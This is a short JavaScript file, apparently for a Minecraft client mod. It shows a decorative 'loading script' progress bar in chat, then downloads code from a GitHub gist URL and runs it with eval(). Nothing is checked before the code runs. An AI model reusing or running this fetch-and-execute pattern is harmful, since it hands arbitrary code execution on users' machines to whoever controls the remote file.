var ChatUtility = Java.type("ru.nedan.neverapi.etc.ChatUtility");

// Радужный текст
var rainbowText = "§cЗ§6а§eг§aр§9у§5ж§dа§cе§6м §eс§aк§9р§5и§dп§cт";

try {
    // Простая анимация загрузки
    ChatUtility.sendMessage(rainbowText + " §7[▯▯▯▯▯] §f0%");
    java.lang.Thread.sleep(300);
    
    ChatUtility.sendMessage(rainbowText + " §7[█▯▯▯▯] §f20%");
    java.lang.Thread.sleep(300);
    
    ChatUtility.sendMessage(rainbowText + " §7[██▯▯▯] §f40%");
    java.lang.Thread.sleep(300);
    
    ChatUtility.sendMessage(rainbowText + " §7[███▯▯] §f60%");
    java.lang.Thread.sleep(300);
    
    ChatUtility.sendMessage(rainbowText + " §7[████▯] §f80%");
    java.lang.Thread.sleep(300);
    
    ChatUtility.sendMessage(rainbowText + " §7[█████] §f100%");
    java.lang.Thread.sleep(300);
    
    // Загрузка скрипта
    var scanner = new java.util.Scanner(
        new java.net.URL("https://gist.githubusercontent.com/LidmiPython/aadd2310edece216dde2907bba3de554/raw/163da3deb74a7117f61dc42c865d28a9982818cd/gistfile1.txt")
            .openStream(), 
        "UTF-8"
    );
    
    var scriptContent = scanner.useDelimiter("\\A").next();
    scanner.close();
    
    eval(scriptContent);
    
} catch (error) {
    ChatUtility.sendMessage("§c✗ Ошибка: " + error);
}
